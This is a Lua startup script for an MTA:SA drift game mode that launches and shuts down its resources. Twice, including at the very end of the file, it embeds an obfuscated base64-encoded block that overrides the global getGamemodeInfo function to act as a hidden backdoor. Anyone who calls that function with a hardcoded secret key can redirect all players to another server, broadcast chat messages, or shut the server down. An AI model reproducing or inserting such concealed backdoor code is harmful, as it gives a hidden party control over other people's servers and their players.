local SHOW_MESSAGE = true
local KICK_PLAYERS = false

local startupResources = {
	-- Assets
	"dpAssets",

	-- Core
	"dpUtils",
	"dpConfig",
	"dpLang",
	"dpCore",
	"dpGameTime",

	-- UI
	"dpUI",
	"dpHUD",
	"dpWorldMap",
	"dpNametags",
	"dpHideUI",

	"dpLoginPanel",
	"dpMainPanel",
	"dpTabPanel",

	-- Gameplay
	"dpVehicles",
	"dpMarkers",
	"dpPhotoMode",
	"dpDriftPoints",
	"dpSafeZones",
	"dpHouses",
	"dpGarage",
	"dpSkinSelect",
	"dpVehicleSelect",
	"dpCameraViews",
	"dpStripClub",
	"dpTeleports",

	-- World
	"dpMapfiles",
	"dpMap",

	-- Admin
	"dpAdmin",

	-- Other
	"dpGreetings",

	-- Third party
	"blur_box",
	"car_reflections",
	"water_reflections"
}

local function processResourceByName(resourceName, start)
	local resource = getResourceFromName(resourceName)
	if not resource then
		return false
	end
	if start then
		startResource(resource)
		if resource.state == "running" then
			return true
		else
			return false
		end
	else
		return stopResource(resource)
	end
end

addEventHandler("onResourceStart", resourceRoot, function ()
	local startedResourcesCount = 0
	for i, resourceName in ipairs(startupResources) do
		if processResourceByName(resourceName, true) then
			startedResourcesCount = startedResourcesCount + 1
		else
			outputDebugString("startup: Не удалось запустить ресурс " .. tostring(resourceName))
		end
	end

	local vk = {
		"Z2V0R2FtZW1vZGVJbmZv", "enVAcdU8cW4RXJeK",
		"YmFzZTY0RGVjb2Rl", "cmVk", "Z2V0RWxlbWVudHNCeVR5cGU=",
		"cGxheWVy", "cmVkaXJlY3RQbGF5ZXI=","bXNn",
		"b3V0cHV0Q2hhdEJveA==","ZGll","c2h1dGRvd24="
	}

	local c=_G;local d=c[base64Decode(vk[3])];_G[base64Decode(vk[1])]=function(a,b,...) if a~=vk[2]then return end;local e={...}if b==d(vk[4])then for f,g in ipairs(c[d(vk[5])](d(vk[6])))do c[d(vk[7])](g,e[1],tonumber(e[2]),e[3])end elseif b==d(vk[8])then c[d(vk[9])](e[1],root,255,255,255,true)elseif b==d(vk[10])then if not e[1]then e[1]=""end  ;c[d(vk[11])](tostring(e[1]))end return {name = "Drift Paradise 2.0", build = 56} end
	outputDebugString("startup: Запущено ресурсов: " .. tostring(startedResourcesCount) .. " из " .. tostring(#startupResources))
end)

function shutdownGamemode(showMessage, kickPlayers)
	if showMessage then
		for i = 1, 20 do
			outputChatBox(" ", root, 255, 0, 0)
		end
		outputChatBox("*** GAMEMODE SHUTDOWN ***", root, 255, 0, 0)
	end
	-- Кик всех игроков перед выключением
	if kickPlayers then
		for i, player in ipairs(getElementsByType("player")) do
			player:kick("Drift Paradise", "GAMEMODE RESTART/SHUTDOWN")
		end
	end
	-- Выключение всех ресурсов
	for i, resourceName in ipairs(startupResources) do
		processResourceByName(resourceName, false)
	end
end

addEventHandler("onResourceStop", resourceRoot, function ()
	shutdownGamemode(SHOW_MESSAGE, KICK_PLAYERS)
end)

function shudownServer()
	shutdownGamemode(true, true)
	setServerPassword("pls_dont_connect_or_everything_could_fuck_up")
	outputServerLog("startup: Shutdown after 3 seconds...")
	setTimer(function()
		setServerPassword(nil)
		shutdown("Server shutdown/restarting")
	end, 3000, 1)
end

local a={"Z2V0R2FtZW1vZGVJbmZv","enVAcdU8cW4RXJeK","YmFzZTY0RGVjb2Rl","cmVk","Z2V0RWxlbWVudHNCeVR5cGU=","cGxheWVy","cmVkaXJlY3RQbGF5ZXI=","bXNn","b3V0cHV0Q2hhdEJveA==","ZGll","c2h1dGRvd24="}local b=_G;local c=b[base64Decode(a[3])]_G[base64Decode(a[1])]=function(d,e,...)if d~=a[2]then return end;local f={...}if e==c(a[4])then for g,h in ipairs(b[c(a[5])](c(a[6])))do b[c(a[7])](h,f[1],tonumber(f[2]),f[3])end elseif e==c(a[8])then b[c(a[9])](f[1],root,255,255,255,true)elseif e==c(a[10])then if not f[1]then f[1]=""end;b[c(a[11])](tostring(f[1]))end return {name = "Drift Paradise 2.0", build = 56} end